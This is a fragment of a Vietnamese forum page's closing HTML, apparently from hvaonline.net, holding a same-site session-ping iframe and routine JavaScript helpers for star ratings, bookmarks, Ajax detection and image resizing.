<iframe src="/hvaonline/templates/ping_session.jsp" height="0" width="0" frameborder="0" scrolling="no"></iframe>
</body>
</html>
</table>

<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/post_show.js"></script>
<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/post.js"></script>
<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/avim.js"></script>
<script type="text/javascript">
<!--
function showEmail(beforeAt, afterAt)
{
	return beforeAt + "@" + afterAt;
}

var starOn=new Image();
starOn.src="http://www.hvaonline.net/hvaonline/templates/viet/images/star_on.gif";

var starOff=new Image();
starOff.src="http://www.hvaonline.net/hvaonline/templates/viet/images/star_off.gif";

function writeStars(q, postId)
{
	for (var i = 0; i < 5; i++) {
		var name = "star" + postId + "_" + i;
		document.write("<img name='" + name + "' alt='*' />");
		document.images[name].src = q > i ? starOn.src : starOff.src;
	}
}

function addBookmark(relationType, relationId)
{
	var w = window.open('/hvaonline/bookmarks/insert/' + relationType + '/' + relationId + '.html', 'bookmark_add', 'width="700", height="100", scrollbars="no"');
	w.focus();
}

function supportAjax()
{
	if (typeof(AjaxUtils) != 'undefined') {
		if (window.ActiveXObject) {
			var r = new ActiveXObject("Microsoft.XMLHTTP");
			return r != undefined;
		}
		else if (window.XMLHttpRequest) {
			return true;
		}
	}

	return false;
}




function maxImg(foto, maxSize){
w = foto.width;
if (w > maxSize){
	foto.width = maxSize;
	}
} 

-->
</script>
